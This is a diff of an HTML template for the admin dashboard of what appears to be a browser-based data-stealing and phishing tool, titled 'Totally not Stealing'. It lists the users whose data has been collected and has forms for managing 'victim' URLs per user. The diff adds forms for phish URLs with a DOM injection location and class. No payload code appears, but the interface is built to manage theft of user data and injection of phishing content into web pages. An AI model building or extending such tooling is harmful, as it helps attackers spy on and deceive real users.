@@ -3,11 +3,11 @@
 {% block title %} Totally not Stealing {% endblock %}
 
 {% block contents %}
-    <h1> Totally Innocent Things are Happening </h1>
-    <h2> Users we have data of: </h2>
-    <ul>
-        {% for user in users %}
-        <li> <a href="/view_user/{{user}}">{{user}}</a>
+<h1> Totally Innocent Things are Happening </h1>
+<h2> Users we have data of: </h2>
+<ul>
+    {% for user in users %}
+    <li> <a href="/view_user/{{user}}">{{user}}</a>
         <form action="{{ url_for('add_secure', email=user)}}" method="POST">
             <label for="url">Secure sites</label>
             <input type="text" name="url" id="url" placeholder="example.com" required>
@@ -86,6 +86,12 @@
                     <td>{{url[1]}}</td>
                     <td>
                         <form action="{{ url_for('delete_victim', email=user, url=url[0]) }}" method="POST">
+                {% for url in secure_urls[user] %}
+                <tr>
+                    <td>{{url}}</td>
+                    <td>A script</td>
+                    <td>
+                        <form action="{{ url_for('delete_secure', email=user, url=url) }}" method="POST">
                             <button type="submit" class="btn btn-danger">Delete</button>
                         </form>
                     </td>
@@ -93,13 +99,40 @@
                 {% endfor %}
             </tbody>
         </table>
-        </li>
-        {% endfor %}
-    </tbody>
-</table>
-<ul>
-    {% for user in users %}
-    <li> <a href="/view_user/{{user}}">{{user}}</a>
+
+        <form action="{{ url_for('add_phish', email=user) }}" method="POST">
+            <label for="url">Phish URL</label>
+            <input type="text" name="url" id="url" placeholder="example.com" required>
+            <label for="inject-loc">Location on Dom</label>
+            <input type="text" name="inject-loc" id="inject-loc" placeholder="body" required>
+            <label for="inject-class">Class</label>
+            <input type="text" name="inject-class" id="inject-class" placeholder="container" required>
+            <input type="submit">
+        </form>
+        <table class="table table-sm table-striped table-bordered">
+            <thead>
+                <tr>
+                    <th scope="col">Url</th>
+                    <th scope="col">Injection Location</th>
+                    <th scope="col">Injection Class</th>
+                    <th scope="col">Delete</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for url in phish_urls[user] %}
+                <tr>
+                    <td>{{url[0]}}</td>
+                    <td>{{url[1]}}</td>
+                    <td>{{url[2]}}</td>
+                    <td>
+                        <form action="{{ url_for('delete_phish', email=user, url=url[0]) }}" method="POST">
+                            <button type="submit" class="btn btn-danger">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
     </li>
     {% endfor %}
 </ul>
